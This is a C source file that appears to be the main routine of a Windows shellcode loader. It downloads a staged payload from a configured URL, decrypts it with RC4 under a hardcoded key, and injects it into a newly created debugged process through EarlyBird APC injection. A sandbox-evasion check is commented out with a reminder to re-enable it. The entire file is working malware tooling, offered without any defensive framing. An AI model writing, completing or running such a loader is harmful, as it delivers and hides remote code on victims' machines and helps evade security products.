// Custom
#include "sandbox.h"
#include "crypt.h"
#include "config.h"
#include "staging.h"
#include "injection.h"

// standard libraries
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

int main(int argc, char* argv[]) {
	// Sandbox checks
	/*
	if (!checkDomainName()) {
		DEBUG_PRINT("Bye!");
		//return -1; // DONT FORGET TO UNCOMMENT ME
	}
	*/

	// Retrieve staged payload
	SIZE_T Size = NULL;
	PBYTE payloadBytes = NULL;

	GetPayloadFromUrl(PAYLOADURL, &payloadBytes, &Size);

	unsigned char key[] = {
		0xCA, 0xFE
	};

	// Intializing rc4 structures
	Rc4Context ctx = { 0 };
	rc4Init(&ctx, key, sizeof(key));

	// Decryption
	// Allocate a buffer exactly as large as the downloaded blob
	unsigned char* decryptedShellcode = (unsigned char*)malloc(Size);
	if (!decryptedShellcode) {
		fprintf(stderr, "[!] malloc failed\n");
		return -1;
	}
	RtlSecureZeroMemory(decryptedShellcode, Size);

	// Decrypt exactly 'Size' bytes of binary data
	rc4Cipher(&ctx, payloadBytes, decryptedShellcode, Size);

	// EarlyBird APC Injection
	HANDLE		hProcess, hThread = NULL;
	DWORD		dwProcessId = NULL;
	PVOID		pAddress = NULL;


	//	creating target remote process (in debugged state)
	DEBUG_PRINT("[i] Creating \"%s\" Process As A Debugged Process ... ", APCINJECT_PROCESS);
	if (!CreateSuspendedProcess(APCINJECT_PROCESS, &dwProcessId, &hProcess, &hThread)) {
		return -1;
	}
	DEBUG_PRINT("\t[i] Target Process Created With Pid : %d \n", dwProcessId);
	DEBUG_PRINT("[+] DONE \n\n");


	// injecting the payload and getting the base address of it
	DEBUG_PRINT("[i] Writing Shellcode To The Target Process ... ");
	if (!InjectShellcodeToRemoteProcess(hProcess, decryptedShellcode, Size, &pAddress)) {
		return -1;
	}
	DEBUG_PRINT("[+] DONE \n\n");

	//	running QueueUserAPC
	QueueUserAPC((PTHREAD_START_ROUTINE)pAddress, hThread, NULL);


	DEBUG_PRINT("[i] Detaching The Target Process ... ");
	DebugActiveProcessStop(dwProcessId);

	LocalFree(payloadBytes);
	free(decryptedShellcode);

	CloseHandle(hProcess);
	CloseHandle(hThread);

	//getchar();

	return 0;
}